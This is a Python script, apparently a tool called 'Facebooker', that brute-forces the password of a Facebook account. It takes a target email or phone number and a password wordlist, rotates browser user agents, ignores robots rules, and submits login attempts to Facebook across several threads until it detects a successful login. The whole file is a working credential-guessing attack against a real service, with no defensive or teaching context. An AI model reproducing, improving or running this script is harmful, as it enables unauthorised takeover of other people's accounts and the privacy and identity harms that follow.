#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random
import threading

# Function to print banner
def print_banner():
    banner = """
      ███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗███████╗██████╗ 
      ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
      █████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝ █████╗  ██████╔╝
      ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
      ██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
      ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """
    print(banner)

# Setup user-agents for random selection
useragents = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'
]

login_url = 'https://www.facebook.com/login.php?login_attempt=1'

# Get email and wordlist from user input
def get_input():
    email = str(input("Enter the Facebook Username (or) Email (or) Phone Number: "))
    passwordlist = str(input("Enter the wordlist name and path: "))
    return email, passwordlist

# Setup browser with mechanize
def setup_browser():
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()

    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

    return br

# Function to attempt brute force attack
def brute(br, email, password):
    try:
        sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
        sys.stdout.flush()

        br.addheaders = [('User-agent', random.choice(useragents))]
        br.open(login_url)
        br.select_form(nr=0)
        br.form['email'] = email
        br.form['pass'] = password
        response = br.submit()
        log = response.geturl()

        if log != login_url and 'login_attempt' not in log:
            print("\n\n[+] Password Found = {}".format(password))
            input("Press ANY KEY to Exit....")
            sys.exit(1)

    except mechanize.HTTPError as e:
        print(f"HTTP Error: {e.code}")
    except mechanize.URLError as e:
        print(f"URL Error: {e.reason}")
    except Exception as e:
        print(f"General Error: {str(e)}")

# Function to run brute force with threading
def thread_brute(passwords, br, email):
    for password in passwords:
        password = password.strip()
        brute(br, email, password)

# Search password function with multi-threading
def search_password(br, email, passwordlist):
    with open(passwordlist, "r") as file:
        password_list = file.readlines()

        # Split the wordlist into chunks for threading
        chunk_size = max(1, len(password_list) // 4)  # Ensure at least one password per thread
        threads = []

        for i in range(0, len(password_list), chunk_size):
            chunk = password_list[i:i + chunk_size]
            t = threading.Thread(target=thread_brute, args=(chunk, br, email))
            threads.append(t)
            t.start()

        # Wait for all threads to complete
        for t in threads:
            t.join()

    print("Password does not exist in the wordlist.")

# Main function
def main():
    print_banner()  # Print the banner at the start
    email, passwordlist = get_input()
    br = setup_browser()
    search_password(br, email, passwordlist)

if __name__ == '__main__':
    main()
